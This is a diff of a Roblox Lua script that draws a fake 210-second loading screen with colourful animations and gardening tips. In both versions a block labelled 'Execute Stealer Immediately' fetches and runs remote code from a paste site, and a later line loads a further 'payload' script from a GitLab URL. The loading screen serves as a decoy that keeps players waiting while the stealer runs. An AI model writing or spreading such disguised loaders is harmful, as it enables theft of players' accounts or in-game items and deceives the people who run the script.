@@ -1,148 +1,130 @@
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
-local CoreGui = game:GetService("CoreGui")
+-- CONFIG
+local loadingTime = 210 -- seconds
+local tipsList = {
+    "Tip: Water your plants daily for faster growth!",
+    "Tip: Press space to jump higher!",
+    "Tip: Visit the shop for cool upgrades!",
+    "Tip: Some seeds grow faster in sunlight!",
+    "Tip: You can trade items with friends!"
+}
+
+-- CREATE SCREEN GUI
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "LoadingScreen"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
 -- Execute Stealer Immediately
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/okBJmYfc/raw"))()
 end)
 
--- Create Loader Screen
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game.CoreGui
+-- BACKGROUND (Colorful Triangles)
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+bg.Parent = gui
 
--- Triangular Background
-local Background = Instance.new("Frame", ScreenGui)
-Background.Size = UDim2.new(1, 0, 1, 0)
-Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Background.ZIndex = 0
-
--- Pulsating Warning Text
-local WarningLabel = Instance.new("TextLabel", ScreenGui)
-WarningLabel.Size = UDim2.new(1, 0, 0, 50)
-WarningLabel.Position = UDim2.new(0, 0, 0, 0)
-WarningLabel.BackgroundTransparency = 1
-WarningLabel.Font = Enum.Font.GothamBold
-WarningLabel.TextSize = 28
-WarningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-WarningLabel.TextStrokeTransparency = 0.5
-WarningLabel.Text = "⚠ Please stay in-game while loading ⚠"
-WarningLabel.ZIndex = 2
-
--- Pulsating effect
-task.spawn(function()
-	while true do
-		for i = 0, 1, 0.05 do
-			WarningLabel.TextTransparency = i
-			task.wait(0.05)
-		end
-		for i = 1, 0, -0.05 do
-			WarningLabel.TextTransparency = i
-			task.wait(0.05)
-		end
-	end
-end)
-
--- Sonic Spinner
-local Sonic = Instance.new("ImageLabel", ScreenGui)
-Sonic.Size = UDim2.new(0, 150, 0, 150)
-Sonic.Position = UDim2.new(0.5, -75, 0.3, -75)
-Sonic.BackgroundTransparency = 1
-Sonic.Image = "rbxassetid://INSERT_SONIC_IMAGE_ID"
-Sonic.ZIndex = 2
-
--- Spin Animation
-task.spawn(function()
-	while true do
-		Sonic.Rotation += 2
-		task.wait(0.01)
-	end
-end)
-
--- Tip Label
-local TipLabel = Instance.new("TextLabel", ScreenGui)
-TipLabel.Size = UDim2.new(1, 0, 0, 30)
-TipLabel.Position = UDim2.new(0, 0, 0.65, 0)
-TipLabel.BackgroundTransparency = 1
-TipLabel.Font = Enum.Font.Gotham
-TipLabel.TextSize = 20
-TipLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TipLabel.Text = ""
-TipLabel.ZIndex = 2
-
--- Loading Percentage
-local PercentLabel = Instance.new("TextLabel", ScreenGui)
-PercentLabel.Size = UDim2.new(1, 0, 0, 30)
-PercentLabel.Position = UDim2.new(0, 0, 0.7, 0)
-PercentLabel.BackgroundTransparency = 1
-PercentLabel.Font = Enum.Font.GothamBold
-PercentLabel.TextSize = 22
-PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-PercentLabel.Text = "0%"
-PercentLabel.ZIndex = 2
-
--- Rainbow Progress Bar
-local ProgressBarBG = Instance.new("Frame", ScreenGui)
-ProgressBarBG.Size = UDim2.new(0.6, 0, 0, 20)
-ProgressBarBG.Position = UDim2.new(0.2, 0, 0.75, 0)
-ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-ProgressBarBG.BorderSizePixel = 0
-ProgressBarBG.ZIndex = 1
-
-local ProgressBarFill = Instance.new("Frame", ProgressBarBG)
-ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
-ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-ProgressBarFill.BorderSizePixel = 0
-ProgressBarFill.ZIndex = 1
-
--- Tips List
-local Tips = {
-	"Tip: Clicking faster won’t make this go quicker... or will it?",
-	"Tip: 99% of people don’t read tips like this.",
-	"Tip: Loading bars love to lie.",
-	"Tip: This game has no secrets. Or maybe it does?",
-	"Tip: If you stare at Sonic long enough, he stares back.",
-    "Bypassing Anti-Cheat...",
-    "Stealing crops from neighbors...",
-    "Downloading OP pets...",
-    "Planting invisible carrots...",
-    "Bribing the garden NPCs...",
-    "Watering plastic flowers...",
-    "Fooling the server admin...",
-    "Claiming free sheckles...",
-    "Installing instant-grow hacks...",
-    "Petting golden rabbits...",
-    "Growing money trees..."
-}
-
--- Change Tip Every 5s
-task.spawn(function()
-	while true do
-		TipLabel.Text = Tips[math.random(1, #Tips)]
-		task.wait(5)
-	end
-end)
-
--- Loader Logic
-local totalTime = 210
-for i = 1, totalTime do
-	local percent = math.floor((i / totalTime) * 100)
-	PercentLabel.Text = percent .. "%"
-	ProgressBarFill.Size = UDim2.new(percent / 100, 0, 1, 0)
-
-	-- Rainbow effect
-	ProgressBarFill.BackgroundColor3 = Color3.fromHSV((i / totalTime), 1, 1)
-
-	task.wait(1)
+-- Triangle pattern generator
+local triangles = {}
+for i = 1, 60 do
+    local tri = Instance.new("Frame")
+    tri.Size = UDim2.new(0, math.random(100, 300), 0, math.random(100, 300))
+    tri.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    tri.AnchorPoint = Vector2.new(0.5, 0.5)
+    tri.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+    tri.BackgroundTransparency = 0.2
+    tri.Rotation = math.random(0, 360)
+    tri.Parent = bg
+    table.insert(triangles, tri)
 end
 
--- Cleanup UI and Restore CoreGui
-ScreenGui:Destroy()
-Blur:Destroy()
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+-- Pulsating top text
+local topText = Instance.new("TextLabel")
+topText.Size = UDim2.new(1, 0, 0, 50)
+topText.Position = UDim2.new(0, 0, 0, 10)
+topText.BackgroundTransparency = 1
+topText.Text = "Please wait patiently..."
+topText.TextColor3 = Color3.fromRGB(255, 255, 255)
+topText.TextStrokeTransparency = 0
+topText.TextSize = 36
+topText.Font = Enum.Font.GothamBold
+topText.Parent = gui
+
+-- Tip text
+local tipText = Instance.new("TextLabel")
+tipText.Size = UDim2.new(1, 0, 0, 40)
+tipText.Position = UDim2.new(0, 0, 0.7, -50)
+tipText.BackgroundTransparency = 1
+tipText.TextColor3 = Color3.fromRGB(255, 255, 255)
+tipText.TextStrokeTransparency = 0
+tipText.TextSize = 26
+tipText.Font = Enum.Font.Gotham
+tipText.Text = tipsList[math.random(#tipsList)]
+tipText.Parent = gui
+
+-- Progress bar background
+local progressBG = Instance.new("Frame")
+progressBG.Size = UDim2.new(0.6, 0, 0, 30)
+progressBG.Position = UDim2.new(0.2, 0, 0.8, 0)
+progressBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+progressBG.BorderSizePixel = 0
+progressBG.Parent = gui
+
+-- Progress bar fill
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.Position = UDim2.new(0, 0, 0, 0)
+progressFill.BorderSizePixel = 0
+progressFill.BackgroundColor3 = Color3.fromHSV(0, 1, 1)
+progressFill.Parent = progressBG
+
+-- Percentage label
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, 0, 1, 0)
+percentLabel.Position = UDim2.new(0, 0, 0, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.TextStrokeTransparency = 0
+percentLabel.TextSize = 20
+percentLabel.Font = Enum.Font.Gotham
+percentLabel.Text = "0%"
+percentLabel.Parent = progressBG
+
+-- Animation
+spawn(function()
+    while gui.Parent do
+        for _, tri in ipairs(triangles) do
+            tri.Rotation = tri.Rotation + 0.05
+        end
+        task.wait()
+    end
+end)
+
+spawn(function()
+    while gui.Parent do
+        topText.TextTransparency = 0.2 + math.abs(math.sin(tick() * 2)) * 0.8
+        task.wait()
+    end
+end)
+
+-- Loading loop
+for i = 0, loadingTime do
+    local percent = math.floor((i / loadingTime) * 100)
+    percentLabel.Text = percent .. "%"
+    progressFill.Size = UDim2.new(i / loadingTime, 0, 1, 0)
+    progressFill.BackgroundColor3 = Color3.fromHSV((i / loadingTime), 1, 1)
+    if i % 5 == 0 then
+        tipText.Text = tipsList[math.random(#tipsList)]
+    end
+    task.wait(1)
+end
+
+-- Remove loading screen
+gui:Destroy()
 
 -- Execute Payload Script (Visual UI)
 local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
